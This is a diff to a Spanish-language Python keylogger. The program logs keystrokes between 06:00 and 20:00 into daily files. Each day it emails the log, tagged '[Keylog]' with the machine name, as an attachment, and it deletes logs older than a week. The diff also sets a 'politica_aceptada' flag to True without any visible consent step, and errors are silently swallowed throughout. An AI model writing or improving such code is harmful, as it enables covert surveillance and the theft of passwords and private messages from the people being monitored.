@@ -11,15 +11,12 @@ import threading
 import time as time_module
 
 # ---------- Configuración ----------
-# Obtener la ruta del directorio donde se ejecuta el programa
 if getattr(sys, 'frozen', False):
-    # Si es un ejecutable compilado
     APP_DIR = os.path.dirname(sys.executable)
 else:
-    # Si se ejecuta como script
     APP_DIR = os.path.dirname(os.path.abspath(__file__))
 
-LOG_FILE = os.path.join(APP_DIR, "system_log.dat")
+LOGS_DIR = os.path.join(APP_DIR, "logs")
 CONFIG_FILE = os.path.join(APP_DIR, "config.dat")
 START = time(hour=6, minute=0)
 END = time(hour=20, minute=0)
@@ -62,7 +59,8 @@ def guardar_config():
     """Guarda la configuración."""
     config = {
         "nombre_equipo": nombre_equipo,
-        "fecha_instalacion": datetime.now().isoformat()
+        "fecha_instalacion": datetime.now().isoformat(),
+        "politica_aceptada": True
     }
     try:
         with open(CONFIG_FILE, "w", encoding="utf-8") as f:
@@ -78,31 +76,41 @@ def inicializar_config():
         guardar_config()
 
 # ---------- Funciones de Log ----------
+def obtener_log_del_dia():
+    """Obtiene la ruta del archivo de log del día actual."""
+    fecha = datetime.now().strftime('%Y-%m-%d')
+    if not os.path.exists(LOGS_DIR):
+        os.makedirs(LOGS_DIR)
+    return os.path.join(LOGS_DIR, f"log_{fecha}.dat")
+
 def dentro_de_horario():
     """Verifica si estamos dentro del horario de captura."""
     ahora = datetime.now().time()
     return START <= ahora <= END
 
 def asegurar_log_existe():
-    """Asegura que el archivo de log existe."""
-    if not os.path.exists(LOG_FILE):
+    """Asegura que el archivo de log del día existe."""
+    log_file = obtener_log_del_dia()
+    if not os.path.exists(log_file):
         try:
-            with open(LOG_FILE, "w", encoding="utf-8") as f:
+            with open(log_file, "w", encoding="utf-8") as f:
                 f.write(f"=== Equipo: {nombre_equipo} ===\n")
+                f.write(f"=== Fecha: {datetime.now().strftime('%Y-%m-%d')} ===\n")
                 f.write(f"=== Inicio: {datetime.now().isoformat()} ===\n\n")
         except:
             pass
 
 def log_key(text):
-    """Añade una entrada al archivo de log."""
+    """Añade una entrada al archivo de log del día."""
     if not dentro_de_horario():
         return False
     
     try:
+        log_file = obtener_log_del_dia()
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         linea = f"[{timestamp}] {text}\n"
         
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
+        with open(log_file, "a", encoding="utf-8") as f:
             f.write(linea)
         return True
     except:
@@ -134,11 +142,12 @@ def enviar_mail_con_adjuntos(subject: str, body: str, attachments: list) -> tupl
 
         for path in attachments:
             try:
-                with open(path, "rb") as f:
-                    data = f.read()
-                filename = os.path.basename(path)
-                msg.add_attachment(data, maintype="application", 
-                                 subtype="octet-stream", filename=filename)
+                if os.path.exists(path):
+                    with open(path, "rb") as f:
+                        data = f.read()
+                    filename = os.path.basename(path)
+                    msg.add_attachment(data, maintype="application", 
+                                     subtype="octet-stream", filename=filename)
             except Exception as e:
                 return False, f"Error adjuntando: {e}"
 
@@ -156,31 +165,50 @@ def enviar_mail_con_adjuntos(subject: str, body: str, attachments: list) -> tupl
     except Exception as e:
         return False, str(e)
 
-def limpiar_log():
-    """Limpia el archivo de log."""
-    try:
-        with open(LOG_FILE, "w", encoding="utf-8") as f:
-            f.write(f"=== Equipo: {nombre_equipo} ===\n")
-            f.write(f"=== Log limpiado: {datetime.now().isoformat()} ===\n\n")
-    except:
-        pass
-
 def enviar_log_programado():
-    """Envía el log automáticamente."""
+    """Envía el log del día automáticamente."""
     try:
-        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) < 100:
-            return
+        log_file = obtener_log_del_dia()
+        
+        # Verificar que existe y tiene contenido
+        if not os.path.exists(log_file):
+            return False, "Log no existe"
+        
+        size = os.path.getsize(log_file)
+        if size < 100:
+            return False, "Log vacío"
         
         fecha = datetime.now().strftime('%Y-%m-%d')
         subject = f"[Keylog] {nombre_equipo} - {fecha}"
         body = f"Registro diario del equipo: {nombre_equipo}\n"
         body += f"Fecha: {fecha}\n"
-        body += f"Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}"
+        body += f"Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}\n"
+        body += f"Tamaño: {size} bytes"
         
-        success, msg = enviar_mail_con_adjuntos(subject, body, [LOG_FILE])
+        success, msg = enviar_mail_con_adjuntos(subject, body, [log_file])
+        return success, msg
+    except Exception as e:
+        return False, str(e)
+
+def limpiar_logs_antiguos():
+    """Elimina logs de más de 7 días."""
+    try:
+        if not os.path.exists(LOGS_DIR):
+            return
         
-        if success:
-            limpiar_log()
+        ahora = datetime.now()
+        for filename in os.listdir(LOGS_DIR):
+            if filename.startswith("log_") and filename.endswith(".dat"):
+                filepath = os.path.join(LOGS_DIR, filename)
+                # Obtener fecha del archivo
+                fecha_str = filename.replace("log_", "").replace(".dat", "")
+                try:
+                    fecha_archivo = datetime.strptime(fecha_str, '%Y-%m-%d')
+                    dias_diff = (ahora - fecha_archivo).days
+                    if dias_diff > 7:
+                        os.remove(filepath)
+                except:
+                    pass
     except:
         pass
 
@@ -193,21 +221,25 @@ def verificar_hora_envio():
             ahora = datetime.now()
             hora_actual = ahora.time()
             
-            # Resetear flag si es un nuevo día
-            if ahora.hour == 0 and ahora.minute < 5:
+            # Resetear flag si es un nuevo día (a las 00:01)
+            if ahora.hour == 0 and ahora.minute == 1:
                 envio_realizado_hoy = False
+                limpiar_logs_antiguos()
             
-            # Verificar si es la hora de envío
-            if (hora_actual.hour == HORA_ENVIO.hour and 
-                hora_actual.minute == HORA_ENVIO.minute and 
-                not envio_realizado_hoy):
-                
-                enviar_log_programado()
-                envio_realizado_hoy = True
+            # Verificar si es la hora de envío (con margen de 1 minuto)
+            minuto_envio = HORA_ENVIO.hour * 60 + HORA_ENVIO.minute
+            minuto_actual = hora_actual.hour * 60 + hora_actual.minute
             
-            # Esperar 60 segundos antes de verificar nuevamente
+            if (minuto_actual == minuto_envio and not envio_realizado_hoy):
+                success, msg = enviar_log_programado()
+                if success:
+                    envio_realizado_hoy = True
+                    # Registrar envío exitoso
+                    log_key(f"[SISTEMA: Correo enviado a las {ahora.strftime('%H:%M')}]")
+            
+            # Esperar 60 segundos
             time_module.sleep(60)
-        except:
+        except Exception as e:
             time_module.sleep(60)
 
 # ---------- Inicio del Servicio ----------
